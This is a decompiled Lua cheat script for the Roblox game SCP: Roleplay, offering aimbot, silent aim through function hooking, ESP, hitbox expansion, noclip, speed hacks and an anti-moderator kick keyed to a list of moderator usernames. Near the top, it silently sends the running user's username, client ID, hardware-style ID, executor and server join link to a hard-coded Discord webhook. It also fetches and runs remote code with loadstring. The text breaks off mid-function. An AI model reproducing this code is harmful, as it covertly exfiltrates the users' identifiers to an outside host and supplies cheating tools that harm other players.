-- CN
-- 开源by：MR
-- http://qins.mc.hi.cn/MR-S
-- 功能效果没测试过,自行测试,如有损坏自行修复！
-- 全源开源，应该没有人闲的没事拿这个圈钱吧？
-- 最后：请标明来源，谢谢！

-- EN
-- Open Source by: MR
-- http://qins.mc.hi.cn/MR-S
-- Functionality hasn't been tested; test it yourself and fix any issues if damaged!
-- Fully open-source; hopefully no one would bother monetizing this, right?
-- Lastly: Please credit the source, thank you!


local vu1 = 'voidpath_key.txt'
local vu2 = game:GetService('HttpService')

local function vu6(pu3)
    local v4, v5 = pcall(function()
        return game:HttpGet(pu3)
    end)

    if v4 then
        return v5
    end

    warn('Failed to fetch from: ' .. pu3)

    return nil
end

local vu7 = vu6('https://billowing-wave-838f.voidpathhub.workers.dev/')
local v8 = {}
local vu9

if vu7 then
    local v10

    v10, vu9 = pcall(function()
        return vu2:JSONDecode(vu7)
    end)

    if not v10 then
        vu9 = v8
    end
else
    vu9 = v8
end

local function vu320()
    local vu11 = game:GetService('HttpService')
    local v12 = game:GetService('Players').LocalPlayer
    local v13 = v12.DisplayName
    local _ = v12.Character
    local v14 = v12.UserId .. '-' .. v12.AccountAge
    local vu15 = [[https://discord.com/api/webhooks/1405888312425582673/AvFs4rSR9RWkC6FE94Tk8DxKDKIq-SJel1eAsMnlpqPg1vJOgMb42O4n2XztUJ6trWoD]]
    local v16 = 'Unknown'
    local v17 = '1.0'

    if identifyexecutor then
        local v18, v19, v20 = pcall(identifyexecutor)

        if v18 then
            v16 = v19 or 'Unknown'
            v17 = v20 or '1.0'
        end
    end

    local v21 = os.time() - v12.AccountAge * 86400
    local v22 = os.date('!*t', v21)
    local vu23 = vu6(string.format([[https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true]], v12.UserId))
    local v24 = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. v12.UserId .. '&width=180&height=180&format=png'

    if vu23 then
        local v25, v26 = pcall(function()
            return vu11:JSONDecode(vu23)
        end)

        if v25 and (v26.data and v26.data[1]) then
            v24 = v26.data[1].imageUrl
        end
    end

    local vu27 = {
        username = 'SCP: Roleplay Execution Logs',
        avatar_url = [[https://cdn.discordapp.com/attachments/1405888287222267975/1405897113468145664/bbmkV2u.png?ex=68a07f38&is=689f2db8&hm=62331a878029b00d0d0c4c9cf430a3525a3fdfcc62ba58376263a3add9a23909&]],
    }
    local v28 = {}
    local v29 = {
        color = 3093151,
        title = 'Execution Log',
        thumbnail = {
            url = v24
        },
        fields = {
            {
                name = 'Username',
                value = v12.Name,
                inline = true,
            },
            {
                name = 'Display Name',
                value = v13,
                inline = true,
            },
            {
                name = 'Join User',
                value = [[```game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. ',"' .. game.JobId .. '")```',
                inline = false,
            },
            {
                name = 'HWID',
                value = v14,
                inline = false,
            },
            {
                name = 'Client ID',
                value = game:GetService('RbxAnalyticsService'):GetClientId(),
                inline = false,
            },
            {
                name = 'Executor',
                value = v16 .. ' ' .. v17,
                inline = true,
            },
            {
                name = 'Account Age',
                value = v12.AccountAge .. ' day(s)',
                inline = true,
            },
            {
                name = 'Date Joined',
                value = v22.month .. '/' .. v22.day .. '/' .. v22.year,
                inline = true,
            },
        },
        timestamp = DateTime.now():ToIsoDate(),
    }

    __set_list(v28, 1, {
        v29
    })

    vu27.embeds = v28

    local vu30 = request or http_request

    if vu30 then
        pcall(function()
            local v31 = vu30
            local v32 = {
                Url = vu15,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json',
                },
                Body = vu11:JSONEncode(vu27),
            }

            v31(v32)
        end)
    end

    local vu33 = loadstring(vu6('https://sirius.menu/rayfield'))()
    local vu34 = loadstring(vu6([[https://raw.githubusercontent.com/GhostDuckyy/ESP-Library/main/Kiriot22/source.lua]]))()

    vu34.Name = true
    vu34.TeamColor = false
    vu34.Tracers = false
    vu34.Boxes = false

    local vu35 = game:GetService('Players')
    local vu36 = game:GetService('RunService')
    local vu37 = game:GetService('UserInputService')
    local vu38 = game:GetService('Lighting')
    local vu39 = workspace.CurrentCamera
    local vu40 = vu35.LocalPlayer
    local v41 = vu33
    local v42 = {
        Name = 'VoidPath | SCP Roleplay',
        Icon = 0,
        LoadingTitle = 'VoidPath | SCP Roleplay',
        LoadingSubtitle = 'by Ryan',
        ShowText = 'VoidPath',
        Theme = {
            TextColor = Color3.fromRGB(255, 255, 255),
            Background = Color3.fromRGB(10, 10, 10),
            Topbar = Color3.fromRGB(15, 15, 15),
            Shadow = Color3.fromRGB(5, 5, 5),
            NotificationBackground = Color3.fromRGB(20, 20, 20),
            NotificationActionsBackground = Color3.fromRGB(240, 240, 240),
            TabBackground = Color3.fromRGB(25, 25, 25),
            TabStroke = Color3.fromRGB(40, 40, 40),
            TabBackgroundSelected = Color3.fromRGB(255, 255, 255),
            TabTextColor = Color3.fromRGB(255, 255, 255),
            SelectedTabTextColor = Color3.fromRGB(0, 0, 0),
            ElementBackground = Color3.fromRGB(20, 20, 20),
            ElementBackgroundHover = Color3.fromRGB(30, 30, 30),
            SecondaryElementBackground = Color3.fromRGB(15, 15, 15),
            ElementStroke = Color3.fromRGB(50, 50, 50),
            SecondaryElementStroke = Color3.fromRGB(40, 40, 40),
            SliderBackground = Color3.fromRGB(200, 200, 200),
            SliderProgress = Color3.fromRGB(0, 0, 0),
            SliderStroke = Color3.fromRGB(255, 255, 255),
            ToggleBackground = Color3.fromRGB(20, 20, 20),
            ToggleEnabled = Color3.fromRGB(255, 255, 255),
            ToggleDisabled = Color3.fromRGB(80, 80, 80),
            ToggleEnabledStroke = Color3.fromRGB(255, 255, 255),
            ToggleDisabledStroke = Color3.fromRGB(120, 120, 120),
            ToggleEnabledOuterStroke = Color3.fromRGB(200, 200, 200),
            ToggleDisabledOuterStroke = Color3.fromRGB(60, 60, 60),
            DropdownSelected = Color3.fromRGB(30, 30, 30),
            DropdownUnselected = Color3.fromRGB(20, 20, 20),
            InputBackground = Color3.fromRGB(15, 15, 15),
            InputStroke = Color3.fromRGB(80, 80, 80),
            PlaceholderColor = Color3.fromRGB(180, 180, 180),
        },
        ToggleUIKeybind = 'K',
        DisableRayfieldPrompts = false,
        DisableBuildWarnings = false,
        ConfigurationSaving = {
            Enabled = true,
            FolderName = 'VoidPath',
            FileName = 'VoidPathKeySystem',
        },
    }
    local v43 = vu33.CreateWindow(v41, v42)
    local v44 = v43:CreateTab('Introduction', 'info')

    v44:CreateLabel('Welcome to VoidPath SCP Roleplay Hub!')
    v44:CreateLabel('Version 1.5 | Author: Ryan')
    v44:CreateButton({
        Name = 'Copy Discord Invite',
        Callback = function()
            if setclipboard then
                setclipboard('https://discord.gg/ssnKXk7J8G')
                vu33:Notify({
                    Title = 'Copied to Clipboard',
                    Content = 'Discord invite link copied!',
                    Duration = 5,
                    Image = 4483362458,
                })
            else
                vu33:Notify({
                    Title = 'Error',
                    Content = 'Clipboard not supported on this executor',
                    Duration = 5,
                    Image = 4483362458,
                })
            end
        end,
    })

    local v45 = vu33

    vu33.Notify(v45, {
        Title = 'Welcome to VoidPath',
        Content = "You're now running the SCP: Roleplay hub.",
        Duration = 6.5,
        Image = 4483362458,
    })

    local v46 = v43:CreateTab('Combat', 'crosshair')
    local v47 = v43:CreateTab('Character', 'user')
    local v48 = v43:CreateTab('Misc', 'settings')

    v46:CreateSection('ESP')
    v46:CreateToggle({
        Name = 'ESP',
        CurrentValue = false,
        Flag = 'ESP',
        Callback = function(p49)
            vu34:Toggle(p49)
        end,
    })
    v46:CreateToggle({
        Name = 'ESP Tracers',
        CurrentValue = false,
        Flag = 'ESPTracers',
        Callback = function(p50)
            vu34.Tracers = p50
        end,
    })
    v46:CreateToggle({
        Name = 'ESP Boxes',
        CurrentValue = false,
        Flag = 'ESPBoxes',
        Callback = function(p51)
            vu34.Boxes = p51
        end,
    })
    v46:CreateToggle({
        Name = 'ESP TeamColor',
        CurrentValue = false,
        Flag = 'ESPTeamColor',
        Callback = function(p52)
            vu34.TeamColor = p52
        end,
    })
    task.spawn(function()
        while true do
            repeat
                task.wait(5)
            until vu34.Enabled

            vu34:Clear()

            local v53 = vu35
            local v54, v55, v56 = ipairs(v53:GetPlayers())

            while true do
                local v57

                v56, v57 = v54(v55, v56)

                if v56 == nil then
                    break
                end
                if v57 ~= vu40 and v57.Character and (v57.Character:FindFirstChild('HumanoidRootPart') and v57.Character:FindFirstChildWhichIsA('Humanoid')) then
                    vu34:Add(v57.Character)
                end
            end
        end
    end)

    local vu58 = false
    local vu59 = nil

    local function vu66()
        if vu59 then
            vu59:Disconnect()
        end

        local vu60 = vu40.Character

        if vu60 then
            vu59 = vu36.Stepped:Connect(function()
                if vu58 then
                    local v61 = vu60
                    local v62, v63, v64 = ipairs(v61:GetDescendants())

                    while true do
                        local v65

                        v64, v65 = v62(v63, v64)

                        if v64 == nil then
                            break
                        end
                        if v65:IsA('BasePart') and v65.CanCollide then
                            v65.CanCollide = false
                        end
                    end
                end
            end)
        end
    end

    v47:CreateToggle({
        Name = 'Noclip',
        CurrentValue = false,
        Flag = 'Noclip',
        Callback = function(p67)
            vu58 = p67

            if p67 then
                vu66()
            else
                if vu59 then
                    vu59:Disconnect()
                end

                local v68 = vu40.Character

                if v68 then
                    local v69, v70, v71 = ipairs(v68:GetDescendants())

                    while true do
                        local v72

                        v71, v72 = v69(v70, v71)

                        if v71 == nil then
                            break
                        end
                        if v72:IsA('BasePart') then
                            v72.CanCollide = true
                        end
                    end
                end
            end
        end,
    })
    vu40.CharacterAdded:Connect(function()
        if vu58 then
            task.wait(0.25)
            vu66()
        end
    end)

    local vu73 = nil

    v47:CreateToggle({
        Name = 'Anti-Ragdoll',
        CurrentValue = false,
        Flag = 'AntiRagdoll',
        Callback = function(p74)
            if vu73 then
                vu73:Disconnect()
            end
            if p74 then
                vu73 = vu36.Stepped:Connect(function()
                    local v75 = vu40.Character and vu40.Character:FindFirstChild('Ragdoll')

                    if v75 then
                        v75:Destroy()
                    end
                end)
            end
        end,
    })

    local vu76 = false
    local vu77 = 50

    v47:CreateToggle({
        Name = 'Jump Height / Inf Jump',
        CurrentValue = false,
        Flag = 'InfJumpBypass',
        Callback = function(p78)
            vu76 = p78
        end,
    })
    v47:CreateSlider({
        Name = 'Jump Height',
        Range = {
            20,
            150
        },
        Increment = 5,
        CurrentValue = vu77,
        Flag = 'JumpPowerSlider',
        Callback = function(p79)
            vu77 = p79
        end,
    })
    vu37.JumpRequest:Connect(function()
        if vu76 then
            local v80 = vu40.Character

            if v80 then
                v80 = vu40.Character:FindFirstChild('HumanoidRootPart')
            end

            local v81 = vu40.Character

            if v81 then
                v81 = vu40.Character:FindFirstChildWhichIsA('Humanoid')
            end
            if v80 and v81 then
                v81:ChangeState(Enum.HumanoidStateType.Freefall)
                task.wait(0.03)

                v80.Velocity = Vector3.new(v80.Velocity.X, vu77, v80.Velocity.Z)
            end
        end
    end)

    local vu82 = false
    local vu83 = 16

    v47:CreateToggle({
        Name = 'Walk Speed',
        CurrentValue = false,
        Flag = 'BypassWalkSpeed',
        Callback = function(p84)
            vu82 = p84
        end,
    })
    v47:CreateSlider({
        Name = 'Speed Amount',
        Range = {
            16,
            45
        },
        Increment = 1,
        CurrentValue = 16,
        Flag = 'SpeedAmount',
        Callback = function(p85)
            vu83 = p85
        end,
    })
    vu36.RenderStepped:Connect(function()
        if vu82 then
            local v86 = vu40.Character
            local v87

            if v86 then
                v87 = v86:FindFirstChild('HumanoidRootPart')
            else
                v87 = v86
            end
            if v86 then
                v86 = v86:FindFirstChildWhichIsA('Humanoid')
            end
            if v87 and (v86 and v86.MoveDirection.Magnitude > 0) then
                v87.Velocity = v86.MoveDirection * vu83 + Vector3.new(0, v87.Velocity.Y, 0)
            end
        end
    end)

    local vu88 = {
        Brightness = vu38.Brightness,
        ClockTime = vu38.ClockTime,
        FogEnd = vu38.FogEnd,
        Ambient = vu38.Ambient,
        OutdoorAmbient = vu38.OutdoorAmbient,
    }
    local vu89 = nil

    v48:CreateToggle({
        Name = 'Fullbright',
        CurrentValue = false,
        Flag = 'Fullbright',
        Callback = function(p90)
            if p90 then
                vu89 = vu36.RenderStepped:Connect(function()
                    vu38.Brightness = 2
                    vu38.ClockTime = 12
                    vu38.FogEnd = 10000000000
                    vu38.Ambient = Color3.new(1, 1, 1)
                    vu38.OutdoorAmbient = Color3.new(1, 1, 1)
                end)
            else
                if vu89 then
                    vu89:Disconnect()
                end

                local v91, v92, v93 = pairs(vu88)

                while true do
                    local v94

                    v93, v94 = v91(v92, v93)

                    if v93 == nil then
                        break
                    end

                    vu38[v93] = v94
                end
            end
        end,
    })
    v46:CreateSection('Weapon Enhancements')

    local vu95 = false
    local vu96 = {}

    local function vu108()
        if vu95 then
            if hookfunction and not vu96.raycast then
                local vu97 = workspace.Raycast

                vu96.raycast = hookfunction(workspace.Raycast, function(
                    p98, p99, p100, p101
                )
                    if vu95 then
                        local v102 = p100.Unit
                        local v103 = p100.Magnitude

                        p100 = v102:lerp(p100.Unit, 0.85) * v103
                    end

                    return vu97(p98, p99, p100, p101)
                end)
            end

            pcall(function()
                local v104, v105, v106 = pairs(game:GetDescendants())

                while true do
                    local v107

                    v106, v107 = v104(v105, v106)

                    if v106 == nil then
                        break
                    end
                    if (v107:IsA('RemoteEvent') and v107.Name:lower():find('shoot') or v107.Name:lower():find('fire')) and not vu96[v107] then
                        vu96[v107] = v107.OnClientEvent:Connect(function()
                            if vu95 then
                                task.wait(0.001)
                            end
                        end)
                    end
                end
            end)
        end
    end
    local function vu113()
        local v109, v110, v111 = pairs(vu96)

        while true do
            local vu112

            v111, vu112 = v109(v110, v111)

            if v111 == nil then
                break
            end

            pcall(function()
                if typeof(vu112) == 'RBXScriptConnection' then
                    vu112:Disconnect()
                end
            end)
        end

        vu96 = {}
    end

    v46:CreateToggle({
        Name = 'No Spread',
        CurrentValue = false,
        Flag = 'NoSpread',
        Callback = function(p114)
            vu95 = p114

            if p114 then
                vu108()
            else
                vu113()
            end
        end,
    })

    local vu115 = false
    local vu116 = 1.5
    local vu117 = 1.3
    local vu118 = {}
    local vu119 = nil
    local vu120 = 0
    local vu121 = 0.1
    local vu122 = 0.05
    local vu123 = 3

    local function vu124()
        return math.random(- vu122 * 100, vu122 * 100) / 100
    end
    local function vu136()
        if vu115 then
            local v125 = tick()

            if v125 - vu120 >= vu121 then
                vu120 = v125

                local v126 = vu35
                local v127, v128, v129 = pairs(v126:GetPlayers())
                local v130 = 0

                while true do
                    local v131

                    v129, v131 = v127(v128, v129)

                    if v129 == nil or vu123 <= v130 then
                        break
                    end
                    if v131 ~= vu40 and v131.Character then
                        local v132 = v131.Character:FindFirstChild('Head')
                        local v133 = v131.Character:FindFirstChild('UpperTorso') or v131.Character:FindFirstChild('Torso')

                        if v132 and v132:IsA('BasePart') then
                            if not vu118[v132] then
                                vu118[v132] = v132.Size
                            end

                            local v134 = vu124()

                            v132.Size = vu118[v132] * (vu116 + v134)
                            v132.Transparency = math.min(v132.Transparency + 0.1, 0.95)
                            v132.CanCollide = false
                            v130 = v130 + 1
                        end
                        if v133 and v133:IsA('BasePart') then
                            if not vu118[v133] then
                                vu118[v133] = v133.Size
                            end

                            local v135 = vu124()

                            v133.Size = vu118[v133] * (vu117 + v135)
                            v133.Transparency = math.min(v133.Transparency + 0.1, 0.95)
                            v133.CanCollide = false
                            v130 = v130 + 1
                        end
                    end
                end
            end
        else
            return
        end
    end
    local function vu142()
        local v137, v138, v139 = pairs(vu118)

        while true do
            local vu140, vu141 = v137(v138, v139)

            if vu140 == nil then
                break
            end

            v139 = vu140

            if vu140 and vu140.Parent then
                pcall(function()
                    vu140.Size = vu141
                    vu140.Transparency = 0
                    vu140.CanCollide = true
                end)
            end
        end

        vu118 = {}
    end
    local function vu143()
        if vu119 then
            vu119:Disconnect()
        end

        vu119 = vu36.Heartbeat:Connect(function()
            if vu115 then
                pcall(vu136)
            end
        end)
    end

    v46:CreateToggle({
        Name = 'Hitbox Expander',
        CurrentValue = false,
        Flag = 'HitboxExpander',
        Callback = function(p144)
            vu115 = p144

            if p144 then
                vu143()
                vu136()
            else
                if vu119 then
                    vu119:Disconnect()
                end

                vu142()
            end
        end,
    })
    v46:CreateSlider({
        Name = 'Head Hitbox Size',
        Range = {
            1,
            2.5
        },
        Increment = 0.1,
        CurrentValue = vu116,
        Flag = 'HeadHitboxSize',
        Callback = function(p145)
            vu116 = p145
        end,
    })
    v46:CreateSlider({
        Name = 'Torso Hitbox Size',
        Range = {
            1,
            2
        },
        Increment = 0.1,
        CurrentValue = vu117,
        Flag = 'TorsoHitboxSize',
        Callback = function(p146)
            vu117 = p146
        end,
    })
    v46:CreateSection('Aimbot')

    local vu147 = false
    local vu148 = false
    local vu149 = false
    local vu150 = 100
    local vu151 = true
    local vu152 = Color3.fromRGB(255, 0, 0)
    local vu153 = 0.9
    local vu154 = nil
    local vu155 = nil
    local vu156 = 'Head'
    local vu157 = Drawing.new('Circle')

    vu157.Visible = false
    vu157.Thickness = 1
    vu157.NumSides = 100
    vu157.Radius = vu150
    vu157.Color = vu152
    vu157.Filled = false

    local function vu160(p158)
        if vu155 then
            vu155:Destroy()

            vu155 = nil
        end
        if p158 and p158:FindFirstChild('HumanoidRootPart') then
            local v159 = Instance.new('Highlight')

            v159.Adornee = p158
            v159.FillColor = Color3.fromRGB(255, 0, 0)
            v159.OutlineColor = Color3.fromRGB(255, 0, 0)
            v159.FillTransparency = 0.2
            v159.OutlineTransparency = 0
            v159.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            v159.Parent = p158
            vu155 = v159
        end
    end
    local function vu171(p161)
        local v162 = vu39.CFrame.Position
        local v163 = {
            p161:FindFirstChild('Head'),
            p161:FindFirstChild('UpperTorso') or p161:FindFirstChild('Torso'),
            p161:FindFirstChild('HumanoidRootPart'),
        }
        local v164 = RaycastParams.new()

        v164.FilterType = Enum.RaycastFilterType.Blacklist
        v164.FilterDescendantsInstances = {
            vu40.Character,
        }

        local v165, v166, v167 = ipairs(v163)

        while true do
            local v168

            v167, v168 = v165(v166, v167)

            if v167 == nil then
                break
            end
            if v168 then
                local v169 = v168.Position - v162
                local v170 = workspace:Raycast(v162, v169, v164)

                if v170 and v170.Instance and v170.Instance:IsDescendantOf(p161) then
                    return true
                end
            end
        end

        return false
    end
    local function vu183()
        local v172 = Vector2.new(vu39.ViewportSize.X / 2, vu39.ViewportSize.Y / 2)
        local v173 = vu150
        local v174 = vu35
        local v175, v176, v177 = ipairs(v174:GetPlayers())
        local v178 = nil

        while true do
            local v179

            v177, v179 = v175(v176, v177)

            if v177 == nil then
                break
            end
            if v179 ~= vu40 and v179.Character and (v179.Character:FindFirstChild('HumanoidRootPart') and (not vu148 or v179.Team ~= vu40.Team) and (not vu149 or vu171(v179.Character))) then
                local v180, v181 = vu39:WorldToViewportPoint(v179.Character.HumanoidRootPart.Position)

                if v181 then
                    local v182 = (v172 - Vector2.new(v180.X, v180.Y)).Magnitude

                    if v182 < v173 then
                        v178 = v179
                        v173 = v182
                    end
                end
            end
        end

        return v178
    end

    local vu184 = false

    vu37.InputBegan:Connect(function(p185, p186)
        if p185.UserInputType == Enum.UserInputType.MouseButton1 and not p186 then
            vu184 = true
        end
    end)
    vu37.InputEnded:Connect(function(p187)
        if p187.UserInputType == Enum.UserInputType.MouseButton1 then
            vu184 = false
            vu154 = nil

            if vu155 then
                vu155:Destroy()

                vu155 = nil
            end
        end
    end)
    vu36.RenderStepped:Connect(function()
        vu157.Position = Vector2.new(vu39.ViewportSize.X / 2, vu39.ViewportSize.Y / 2)
        vu157.Radius = vu150
        vu157.Color = vu152

        local v188 = vu157
        local v189 = vu147

        if v189 then
            v189 = vu151
        end

        v188.Visible = v189

        if vu147 and vu184 then
            if vu154 then
                local v190 = vu154.Character

                if v190 then
                    v190 = vu154.Character:FindFirstChildOfClass('Humanoid')
                end
                if not v190 or v190.Health <= 0 then
                    vu154 = nil

                    if vu155 then
                        vu155:Destroy()

                        vu155 = nil
                    end
                end
            end
            if not vu154 then
                vu154 = vu183()

                local v191 = vu160
                local v192 = vu154

                if v192 then
                    v192 = vu154.Character
                end

                v191(v192)
            end

            local v193 = vu154 and vu154.Character and vu154.Character:FindFirstChild(vu156)

            if v193 then
                local v194 = v193.Position
                local v195 = vu39.CFrame.Position
                local v196 = (v194 - v195).Unit

                vu39.CFrame = vu39.CFrame:Lerp(CFrame.new(v195, v195 + v196), vu153)
            end
        end
    end)
    v46:CreateToggle({
        Name = 'Enable Aimbot',
        CurrentValue = false,
        Flag = 'EnableAimbot',
        Callback = function(p197)
            vu147 = p197

            if not p197 and vu155 then
                vu155:Destroy()

                vu155 = nil
            end
        end,
    })
    v46:CreateToggle({
        Name = 'Aimbot FOV Visible',
        CurrentValue = true,
        Flag = 'AimbotFOVVisible',
        Callback = function(p198)
            vu151 = p198
        end,
    })
    v46:CreateToggle({
        Name = 'Team Check',
        CurrentValue = false,
        Flag = 'AimbotTeamCheck',
        Callback = function(p199)
            vu148 = p199
        end,
    })
    v46:CreateToggle({
        Name = 'Wall Check',
        CurrentValue = false,
        Flag = 'AimbotWallCheck',
        Callback = function(p200)
            vu149 = p200
        end,
    })
    v46:CreateSlider({
        Name = 'FOV Radius',
        Range = {
            50,
            300
        },
        Increment = 5,
        CurrentValue = vu150,
        Flag = 'AimbotFOV',
        Callback = function(p201)
            vu150 = p201
        end,
    })
    v46:CreateColorPicker({
        Name = 'FOV Circle Color',
        Color = vu152,
        Flag = 'FOVColor',
        Callback = function(p202)
            vu152 = p202
        end,
    })
    v46:CreateSection('Silent Aim')

    local vu203 = false
    local vu204 = false
    local vu205 = false
    local vu206 = 100
    local vu207 = true
    local vu208 = Color3.fromRGB(0, 255, 0)
    local vu209 = 'Head'
    local vu210 = nil
    local vu211 = 0
    local vu212 = 0.05
    local vu213 = Drawing.new('Circle')

    vu213.Visible = false
    vu213.Thickness = 1
    vu213.NumSides = 50
    vu213.Radius = vu206
    vu213.Color = vu208
    vu213.Filled = false

    local function vu226()
        local v214 = tick()

        if v214 - vu211 < vu212 then
            return vu210
        end

        vu211 = v214

        local v215 = Vector2.new(vu39.ViewportSize.X / 2, vu39.ViewportSize.Y / 2)
        local v216 = vu206
        local v217 = vu35
        local v218, v219, v220 = ipairs(v217:GetPlayers())
        local v221 = nil

        while true do
            local v222

            v220, v222 = v218(v219, v220)

            if v220 == nil then
                break
            end
            if v222 ~= vu40 and v222.Character and (v222.Character:FindFirstChild('HumanoidRootPart') and (not vu204 or v222.Team ~= vu40.Team) and (not vu205 or vu171(v222.Character))) then
                local v223, v224 = vu39:WorldToViewportPoint(v222.Character.HumanoidRootPart.Position)

                if v224 then
                    local v225 = (v215 - Vector2.new(v223.X, v223.Y)).Magnitude

                    if v225 < v216 then
                        v221 = v222
                        v216 = v225
                    end
                end
            end
        end

        vu210 = v221

        return v221
    end

    local vu227 = {}

    local function vu246()
        if hookmetamethod and not vu227.metamethod then
            vu227.metamethod = hookmetamethod(game, '__namecall', function(
                p228, ...
            )
                local v229 = getnamecallmethod()
                local v230 = {
                    ...
                }

                if vu203 and (v229 == 'FireServer' or v229 == 'InvokeServer') then
                    local v231 = vu226()

                    if v231 and v231.Character then
                        local v232 = v231.Character:FindFirstChild(vu209)

                        if v232 then
                            local v233 = Vector3.new(math.random(- 50, 50) / 1000, math.random(- 50, 50) / 1000, math.random(- 50, 50) / 1000)
                            local v234, v235, v236 = ipairs(v230)

                            while true do
                                local v237

                                v236, v237 = v234(v235, v236)

                                if v236 == nil then
                                    break
                                end
                                if typeof(v237) ~= 'Vector3' then
                                    if typeof(v237) == 'CFrame' then
                                        v230[v236] = CFrame.new(vu39.CFrame.Position, v232.Position + v233)
                                    end
                                else
                                    v230[v236] = v232.Position + v233
                                end
                            end
                        end
                    end
                end

                return vu227.metamethod(p228, unpack(v230))
            end)
        end
        if hookfunction and not vu227.raycast then
            local vu238 = workspace.Raycast

            vu227.raycast = hookfunction(workspace.Raycast, function(
                p239, p240, p241, p242
            )
                if vu203 then
                    local v243 = vu226()

                    if v243 and v243.Character then
                        local v244 = v243.Character:FindFirstChild(vu209)

                        if v244 then
                            local v245 = (v244.Position - p240).Unit

                            p241 = p241.Unit:lerp(v245, 0.9) * p241.Magnitude
                        end
                    end
                end

                return vu238(p239, p240, p241, p242)
            end)
        end
    end
    local function vu251()
        local v247, v248, v249 = pairs(vu227)

        while true do
            local vu250

            v249, vu250 = v247(v248, v249)

            if v249 == nil then
                break
            end

            pcall(function()
                if vu250 then
                    vu250()
                end
            end)
        end

        vu227 = {}
    end

    vu36.RenderStepped:Connect(function()
        if vu203 and vu207 then
            vu213.Position = Vector2.new(vu39.ViewportSize.X / 2, vu39.ViewportSize.Y / 2)
            vu213.Radius = vu206
            vu213.Color = vu208
            vu213.Visible = true
        else
            vu213.Visible = false
        end
    end)
    v46:CreateToggle({
        Name = 'Silent Aim',
        CurrentValue = false,
        Flag = 'EnableSilentAim',
        Callback = function(p252)
            vu203 = p252

            if p252 then
                vu246()
            else
                vu251()
            end
        end,
    })
    v46:CreateToggle({
        Name = 'Silent Aim FOV Visible',
        CurrentValue = true,
        Flag = 'SilentAimFOVVisible',
        Callback = function(p253)
            vu207 = p253
        end,
    })
    v46:CreateToggle({
        Name = 'Silent Aim Team Check',
        CurrentValue = false,
        Flag = 'SilentAimTeamCheck',
        Callback = function(p254)
            vu204 = p254
        end,
    })
    v46:CreateToggle({
        Name = 'Silent Aim Wall Check',
        CurrentValue = false,
        Flag = 'SilentAimWallCheck',
        Callback = function(p255)
            vu205 = p255
        end,
    })
    v46:CreateSlider({
        Name = 'Silent Aim FOV',
        Range = {
            30,
            200
        },
        Increment = 5,
        CurrentValue = vu206,
        Flag = 'SilentAimFOV',
        Callback = function(p256)
            vu206 = p256
        end,
    })
    v46:CreateColorPicker({
        Name = 'Silent Aim FOV Color',
        Color = vu208,
        Flag = 'SilentAimFOVColor',
        Callback = function(p257)
            vu208 = p257
        end,
    })
    v46:CreateDropdown({
        Name = 'Silent Aim Target Part',
        Options = {
            'Head',
            'Torso',
        },
        CurrentOption = vu209,
        Flag = 'SilentAimTargetPart',
        Callback = function(p258)
            vu209 = p258
        end,
    })
    v48:CreateButton({
        Name = 'Rejoin Server',
        Callback = function()
            local vu259 = game:GetService('TeleportService')
            local vu260 = game:GetService('Players');
            (function()
                local v261 = vu260.LocalPlayer

                if v261 then
                    vu259:Teleport(game.PlaceId, v261)
                end
            end)()
        end,
    })
    v48:CreateButton({
        Name = 'Server Hop',
        Callback = function()
            local vu262 = game:GetService('HttpService')
            local vu263 = game:GetService('TeleportService')
            local vu264 = game:GetService('Players')
            local vu265 = 5041144419
            local vu266 = game.JobId;
            (function()
                local v267 = ''
                local v268 = nil

                while true do
                    local vu269 = ([[https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100%s]]):format(vu265, v267 ~= '' and '&cursor=' .. v267 or '')
                    local v270, v271 = pcall(function()
                        return vu262:JSONDecode(vu6(vu269) or '{}')
                    end)

                    if not (v270 and (v271 and v271.data)) then
                        break
                    end

                    local v272, v273, v274 = ipairs(v271.data)

                    while true do
                        local v275

                        v274, v275 = v272(v273, v274)

                        if v274 == nil then
                            break
                        end
                        if v275.id ~= vu266 and v275.playing < v275.maxPlayers then
                            v268 = v275.id

                            break
                        end
                    end

                    v267 = v271.nextPageCursor

                    if v268 or not v267 then
                        break
                    end
                end

                if v268 then
                    vu263:TeleportToPlaceInstance(vu265, v268, vu264.LocalPlayer)
                else
                    warn('No suitable server found.')
                end
            end)()
        end,
    })

    local vu276 = {
        Mocalith = true,
        MetatableIndex = true,
        reclare = true,
        ExecutiveFunds = true,
        Sculliansplosh = true,
        jjyuill = true,
        Yatharth50 = true,
        Volnor = true,
        Dominus_World = true,
        BlazeFaces = true,
        Bluered900 = true,
        aidanp777 = true,
        Diamond_Aisle = true,
        Buulhork = true,
        jeremik18 = true,
        CasualCS = true,
        zayne551 = true,
        raditjunior321 = true,
        TimorousShadow = true,
        SealedHorizons = true,
        danila721112 = true,
        DreadnaughtThunderer = true,
        Kilo_Penta = true,
        WxnterSerenade = true,
        Ghosteal = true,
        ['35x56x35'] = true,
        TheCatIAdmire = true,
        slamhy77 = true,
        bhavishya7777 = true,
        Jamie_buddy1 = true,
        xodpc = true,
        Zke3y = true,
        IsleRecognised = true,
        OperatorAdex = true,
        Robloxguy2_0 = true,
        TreyZie1 = true,
        Bat_86 = true,
        aikalow = true,
        DuchessNight = true,
        NitrixOverlord = true,
        Brokenwallcantfixit = true,
        Axonnex = true,
        tTostty = true,
        CollapsingFunds = true,
    }
    local vu277 = 'Moderator detected. You were kicked for safety.'
    local vu278 = true

    v48:CreateToggle({
        Name = 'Anti\u{2011}Moderator',
        CurrentValue = vu278,
        Flag = 'AntiModerator',
        Callback = function(p279)
            vu278 = p279
        end,
    });
    (function()
        if not vu278 then
            return
        end

        local v280 = vu35
        local v281, v282, v283 = ipairs(v280:GetPlayers())

        while true do
            local v284

            v283, v284 = v281(v282, v283)

            if v283 == nil then
                break
            end
            if vu276[v284.Name] then
                vu40:Kick(vu277)

                break
            end
        end
    end)()
    vu35.PlayerAdded:Connect(function(p285)
        if vu278 then
            if vu276[p285.Name] then
                vu40:Kick(vu277)
            end
        end
    end)

    local vu286 = false
    local vu287 = game:GetService('VirtualUser')

    v48:CreateToggle({
        Name = 'Anti-AFK',
        CurrentValue = true,
        Flag = 'AntiAFK',
        Callback = function(p288)
            vu286 = p288
        end,
    })
    vu40.Idled:Connect(function()
        if vu286 then
            vu287:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            task.wait(1)
